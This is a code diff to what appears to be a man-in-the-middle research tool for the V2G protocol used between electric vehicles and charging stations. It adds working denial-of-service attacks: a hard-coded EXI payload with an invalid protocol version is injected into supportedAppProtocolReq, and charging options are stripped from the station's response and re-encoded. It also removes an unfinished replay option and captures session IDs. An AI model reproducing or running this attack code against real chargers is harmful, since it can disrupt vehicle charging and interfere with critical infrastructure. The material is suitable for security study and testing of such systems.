@@ -35,11 +35,11 @@ class V2GTPMessage(object):
         Alters the payload.
         '''
         # alter payload
-        print('Altering payload')
+
         payload = mod_payload
         # alter payload length
-        print(len(mod_payload))
         payload_length = bytearray(struct.pack("BBBB",0,0,0,len(mod_payload)))
+        print('Altering payload')
         # alter payload and payload lenght in data
         temp_data = bytearray(self.data)
         temp_data[8:] = payload
@@ -74,6 +74,13 @@ class V2GTPMessage(object):
         print("Modified xml")
         print(et.tostring(self.tree))
         self.xml_data = et.tostring(self.tree)
+
+        no_charging_methods_payload = self.encode_xml()
+        print("Performing DoS with payload %s" % no_charging_methods_payload)
+        if sys.version_info.major == 2:
+            self.alter_payload(no_charging_methods_payload.decode('hex'))
+        else:
+            self.alter_payload(bytearray.fromhex(no_charging_methods_payload))
 
     # Use V2GDecoder to encode the xml.
     def encode_xml(self):
@@ -121,11 +128,9 @@ if __name__ == "__main__":
     parser = OptionParser()
     parser.add_option("-d", "--DoS", dest="dos_attack", action="store_true", default=False, help="performs a DoS attack by changing the app version of the EV to 0.0")
     parser.add_option("-c", "--ChargeMethodDoS", dest="charge_method_dos", action="store_true", default=False, help="performs a DoS attack by removing charging options on SE")
-    parser.add_option("-e", "--EndlessCharge", dest="endless_charge", action="store_true", default=False, help="performs a replay attach of CharginStatusReq")
     (options, args) = parser.parse_args()
     dos_attack = options.dos_attack
     charge_method_dos = options.charge_method_dos
-    endless_charge = options.endless_charge
 
     # CONSTANTS
     V2G_UDP_SDP_SERVER_PORT = 15118
@@ -254,22 +259,18 @@ if __name__ == "__main__":
                 print("%d) mim -> se1 (EXI - len %s) : %s" % (message_count, hexlify(ev1_message.payload_length), hexlify(ev1_message.payload)))
                 if dos_attack and message_count == 1: # supportedAppProtocolReq
                     # this message does not depend on SessionID
-                    invalid_version_payload = '8000EBAB9371D34B9B79D189A98989C1D191D191818999D26B9B3A232B30000000280040'
-                    # change payload to invalid version
+                    invalid_version_hex_str = '01DE8001000000248000EBAB9371D34B9B79D189A98989C1D191D191818999D26B9B3A232B30000000280040'
                     if sys.version_info.major == 2:
-                        ev1_data = ev1_message.alter_payload(bytearray(invalid_version_payload.decode('hex')))
+                        invalid_version = invalid_version_hex_str.decode("hex")
                     else:
-                        ev1_data = ev1_message.alter_payload(bytearray(bytes.from_hex(invalid_version_payload)))
-                    ev1_message = V2GTPMessage(ev1_data)
-
-                # save 15 message to replay it
-                if endless_charge and message_count == 15:
-                    replay_message = ev1_data
-                if endless_charge and message_count % 2 == 1 and message_count > 15: # 17, 19, ...
-                    ev1_data = replay_message # does not work
-
-                if message_count == 11 or message_count == 13:
+                        invalid_version = bytearray.fromhex(invalid_version_hex_str)
+                    print("Performing DoS with payload %s" % hexlify(invalid_version))
+                    ev1_data = invalid_version
+                    ev1_message = V2GTPMessage(invalid_version)
+                    print("Decoding modified supportedAppProtocolReq")
                     ev1_message.decode_payload_exi()
+                # elif message_count == 11 or message_count == 13:
+                #     ev1_message.decode_payload_exi()
             except Exception as e:
                 print(e)
                 print('ev1: Not a V2GTPMessage')
@@ -280,27 +281,18 @@ if __name__ == "__main__":
             try:
                 se1_message = V2GTPMessage(se1_data)
                 print("%d) mim <- se1 (EXI - len %s) : %s" % (message_count, hexlify(se1_message.payload_length), hexlify(se1_message.payload)))
+                # if message_count == 2:
+                #     se1_message.decode_payload_exi()
                 if message_count == 4: # spoof session id (always by default)
                     se1_message.decode_payload_exi()
                     print("Caught session_id: %s" % se1_message.get_session_id())
-                if charge_method_dos and message_count == 6: # contains charging options to be removed
+                elif charge_method_dos and message_count == 6: # contains charging options to be removed
                     se1_message.decode_payload_exi()
                     se1_message.remove_charging_options()
-                    no_charging_methods_payload = se1_message.encode_xml()
-                    print(no_charging_methods_payload)
-                    print(hexlify(se1_data))
-                    if sys.version_info.major == 2:
-                        se1_data = se1_message.alter_payload(bytearray(no_charging_methods_payload.decode('hex')))
-                    else:
-                        se1_data = se1_message.alter_payload(bytearray(bytes.from_hex(no_charging_methods_payload)))
                     se1_message.decode_payload_exi()
-                    print(hexlify(se1_data))
-                if message_count == 12 or message_count == 14:
+                    se1_data = se1_message.data
+                elif message_count == 12 or message_count == 14:
                     se1_message.decode_payload_exi()
-                # if endless_charge and message_count == 16:
-                #     replay_message = se1_data
-                # if endless_charge and message_count % 2 == 0 and message_count > 16: # 17, 19, ...
-                #     se1_data = replay_message # does not work
             except Exception as e:
                 print(e)
                 print('se1: Not a V2GTPMessage')
